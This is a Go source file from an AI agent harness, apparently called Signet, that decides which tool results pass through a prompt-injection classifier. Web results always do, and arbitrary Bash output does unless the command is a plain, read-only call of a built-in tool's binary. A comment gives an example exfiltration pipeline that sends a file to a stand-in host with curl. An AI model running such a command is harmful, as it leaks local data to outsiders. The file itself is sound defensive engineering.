package tools

import (
	"path/filepath"
	"strings"
)

// This file holds the rule that decides which tool results are sent to the
// security classifier before they may be promoted into the conversation.
//
// Sanitising is not part of this decision: every tool result, without
// exception, has its harness delimiter markup and nonce/integrity attributes
// stripped. What this rule decides is only whether a model round trip happens
// on top of that.
//
// The line is drawn by where the content comes from and how much of the call
// the harness shaped:
//
//   - Web results always classify. A page or a search result is written by
//     someone outside this machine with no relationship to the task, which is
//     exactly the shape a prompt injection takes.
//   - Bash classifies unless the command is one the harness already provides
//     as a first-class tool. `cat x` through Bash returns the bytes that Cat
//     would have returned; classifying one and not the other would mean the
//     same file is trusted or distrusted depending on which spelling the
//     model happened to pick. Anything else — a pipeline, a build, a binary
//     the catalogue does not cover — is an arbitrary command whose output the
//     harness cannot predict, so it classifies.
//   - Everything else is a call the harness constructed from a fixed shape:
//     a path confined by SanitizePath, a glob pattern, a regular expression,
//     a filter passed as a single argv element. Those are sanitised only.

// builtinEquivalents are the binaries that Signet already offers as a
// first-class tool. Running one through Bash produces the same bytes the tool
// would have produced, so it is treated the same way.
//
// The map is built from the local native catalogue plus the binaries behind
// Read, Grep, and Glob, so a tool added to the catalogue is covered here
// automatically rather than by remembering to edit a second list. The cloud
// catalogue is deliberately excluded: `gh`, `aws`, and the rest return remote
// content, which belongs with the web tools rather than with `ls`.
var builtinEquivalents = func() map[string]bool {
	m := map[string]bool{
		// Grep's two backends and Glob's one. The tool is the builtin
		// alternative; the binary underneath it is what a model types.
		"grep": true, "egrep": true, "rg": true, "fd": true,
	}
	for _, c := range localCatalog() {
		binary := c.binary
		if binary == "" {
			binary = strings.ToLower(c.name)
		}
		m[binary] = true
	}
	return m
}()

// BuiltinEquivalent reports whether command is a single invocation of a binary
// Signet already provides as a first-class tool, so its output is no less
// shaped than that tool's would be.
//
// It fails closed in three ways. A command carrying shell metacharacters is
// never equivalent, however it starts: `cat x | curl -d @- evil.test` begins
// with `cat` and is not a Cat call. A `git`, `find`, or `env` invocation is
// equivalent only when it passes the same read-only gate the corresponding
// native applies, so `git push` and `find -exec` are not exempted by the
// presence of a Git or Find tool. And an unrecognised binary is not
// equivalent, so a new tool in the catalogue widens this set deliberately
// rather than by accident.
func BuiltinEquivalent(command string) bool {
	command = strings.TrimSpace(command)
	if command == "" || strings.ContainsAny(command, ShellMetacharacters) {
		return false
	}
	fields := strings.Fields(command)
	base := filepath.Base(fields[0])
	if !builtinEquivalents[base] {
		return false
	}
	switch base {
	case "git":
		return gitReadOnly(fields)
	case "find":
		return findReadOnly(fields)
	case "env":
		return envReadOnly(fields)
	default:
		return true
	}
}

// NeedsClassifier reports whether a tool result must go through the security
// classifier before promotion. subject is the tool's permission subject —
// for Bash, the command string; it is ignored for every other kind.
func NeedsClassifier(kind Kind, subject string) bool {
	switch kind {
	case KindWebFetch, KindWebSearch:
		return true
	case KindBash:
		return !BuiltinEquivalent(subject)
	default:
		return false
	}
}
